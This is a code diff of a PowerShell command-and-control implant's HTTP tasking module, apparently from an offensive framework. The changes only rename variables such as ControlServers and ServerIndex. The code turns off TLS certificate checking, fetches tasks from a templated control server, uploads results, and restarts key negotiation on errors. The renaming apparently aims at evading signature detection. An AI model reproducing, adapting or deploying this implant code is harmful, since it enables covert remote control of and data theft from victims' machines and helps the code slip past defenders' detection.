@@ -1,15 +1,15 @@
 $sad = 12;
-$Script:ServerIndex = 0;
-$Script:server = "{{ host }}";
+$Script:sIndex = 0;
+$Script:myserver = "{{ host }}";
 
-if($server.StartsWith('https')){
+if($myserver.StartsWith('https')){
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 }
-$Script:ControlServers = @($Script:server);
+$Script:Cservs = @($Script:myserver);
 
 $Script:GetTask = {
     try {
-        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+        if ($Script:Cservs[$Script:sIndex].StartsWith("http")) {
 
             # meta 'TASKING_REQUEST' : 4
             $RPacket = New-RoutingPacket -EncData $Null -Meta 4;
@@ -31,7 +31,7 @@ $Script:GetTask = {
 
             # choose a random valid URI for checkin
             $taskURI = $script:TaskURIs | Get-Random;
-            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);
+            $result = $wc.DownloadData($Script:Cservs[$Script:sIndex] + $taskURI);
             $result;
         }
     }
@@ -39,7 +39,7 @@ $Script:GetTask = {
         $script:MissedCheckins += 1;
         if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
             # restart key negotiation
-            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
+            Start-Negotiate -S "$Script:myserver" -SK $SK -UA $ua;
         }
     }
 };
@@ -55,7 +55,7 @@ $Script:SendMessage = {
         # meta 'RESULT_POST' : 5
         $RPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
 
-        if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
+        if($Script:Cservs[$Script:sIndex].StartsWith('http')) {
             # build the web request object
             $wc = New-Object System.Net.WebClient;
             # set the proxy settings for the WC to be the default system settings
@@ -71,13 +71,13 @@ $Script:SendMessage = {
             try {
                 # get a random posting URI
                 $taskURI = $Script:TaskURIs | Get-Random;
-                $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RPacket);
+                $response = $wc.UploadData($Script:Cservs[$Script:sIndex]+$taskURI, 'POST', $RPacket);
             }
             catch [System.Net.WebException]{
                 # exception posting data...
                 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                     # restart key negotiation
-                    Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
+                    Start-Negotiate -S "$Script:myserver" -SK $SK -UA $ua;
                     }
                 }
             }
